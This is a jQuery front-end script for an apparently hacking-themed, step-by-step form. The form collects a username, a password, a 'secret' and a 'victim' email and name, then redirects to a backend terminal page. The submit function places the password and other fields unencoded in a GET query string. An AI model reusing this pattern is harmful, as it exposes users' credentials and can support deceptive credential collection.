
var count = 1;
var shown = [];

var showElem = function(index){

    var elm;
    var x;

    switch(index){
        case 2:
                $('#firstBox .par1').removeClass('hidden');
                setTimeout(function(){$('#password').removeClass('hidden'); $('#password').focus();},1800);
            break;
        case 3:
                cleanShown();
                elm = $('#secondBox');
                elm.removeClass('hidden');
                x = 3000;
                setTimeout(function(){$('#secondBox .par1').removeClass('hidden');},x*0.5);
                setTimeout(function(){$('#secondBox .par2').removeClass('hidden');},x*0.7);
                setTimeout(function(){$('#secondBox .par3').removeClass('hidden');},x*1.5);
                setTimeout(function(){$('#secondBox .par4').removeClass('hidden');},x*2.5);
                setTimeout(function(){$('#secondBox .par5').removeClass('hidden');},x*3.2);
                setTimeout(function(){$('#secondBox .par6').removeClass('hidden'); $('#secret').focus();},x*3.8);

                shown.push(elm);
            break;
        case 4:
                cleanShown();
                elm = $('#thirdBox');
                elm.removeClass('hidden');
                x = 3000;
                setTimeout(function(){$('#thirdBox .par1').removeClass('hidden');},x*0.5);
                setTimeout(function(){$('#thirdBox .par2').removeClass('hidden');},x*1.5);
                setTimeout(function(){$('#thirdBox .par3').removeClass('hidden');},x*2);
                setTimeout(function(){$('#thirdBox .par4').removeClass('hidden');},x*2.8);
                setTimeout(function(){$('#thirdBox .par5').removeClass('hidden');},x*3.4);
                setTimeout(function(){$('#thirdBox .par6').removeClass('hidden'); $('#vemail').focus();},x*3.5);
                shown.push(elm);
            break;
        case 5:
                cleanShown();
                elm = $('#forthBox');
                elm.removeClass('hidden');
                x = 3000;
                setTimeout(function(){$('#forthBox .par1').removeClass('hidden');},x*0.3);
                setTimeout(function(){$('#forthBox .par2').removeClass('hidden');},x*0.8);
                setTimeout(function(){$('#forthBox .par3').removeClass('hidden');},x*2);
                setTimeout(function(){$('#forthBox .par4').removeClass('hidden');},x*3);
                setTimeout(function(){$('#forthBox .par5').removeClass('hidden');},x*3.5);
                setTimeout(function(){$('#forthBox .par6').removeClass('hidden');},x*3.5);
                setTimeout(function(){$('#loading').addClass('hidden'); $('#forthBox .par7').removeClass('hidden');},x*7);

                shown.push(elm);
            break;
    }
};


$(document).on("keypress", ".TabOnEnter" , function(e){
    var index;
    if( e.keyCode ==  13 ){
        index = this.tabIndex+1;
        switch(index){
            case 2:
                    showElem(2);
            case 3:
                var user = $('#user').val();
                var pass = $('#password').val();
                if(user == '' || pass == '')
                    return;
                showElem(3);
                break;
            case 4:
                var secret = $('#secret').val();
                if(secret == '')
                    return;
                showElem(4);
                break;
            case 5:
            case 6:
                var vemail = $('#vemail').val();
                var vname = $('#victim').val();
                if(vemail == '')
                    return;
                else{
                    if(vname == '')
                        $('#victim').focus();
                    else
                        showElem(5);
                }
                break;
        }

}});

var cleanShown = function(){
    for(elm of shown){
        elm.addClass('hidden');
    }
    shown=[];
};

$(document).on("keydown", "form", function(event) { 
    return event.key != "Enter";
});

$(document).ready(function(){
    shown.push($('#firstBox'));
});

var submit = function(){
    var user = $('#user').val();
    var pass = $('#password').val();
    var secret = $('#secret').val();
    var vname = $('#victim').val();

    window.location.replace("./backend/terminal.php?user="+user+"&password="+pass+"&secret="+secret+"&victim="+vname);
};

(function () {
    var width = $(window).width();
    var height = $(window).height();

    if(width<=1024){
        shape = document.getElementsByClassName("svgBG")[0];
        shape.setAttribute("viewBox", "0 0 "+width+" "+height);
        $('#firstResponse h1,#secondBox h1,#thirdBox h1,#forthBox h1').css('font-size', '15px');
        $('#firstBox .h1, #firstBox h1').css('font-size', '1.5rem');
        $('#firstbox .par3 div').css('margin-left','25vw');
    }else{
        $('.item').css('height','83vh');
    }
    if(width <= 500){
        $('#firstResponse h1,#secondBox h1,#thirdBox h1,#forthBox h1').css('font-size', '8px');
        $('#firstbox .par3 div').css('margin-left','22vw');
    }
})();
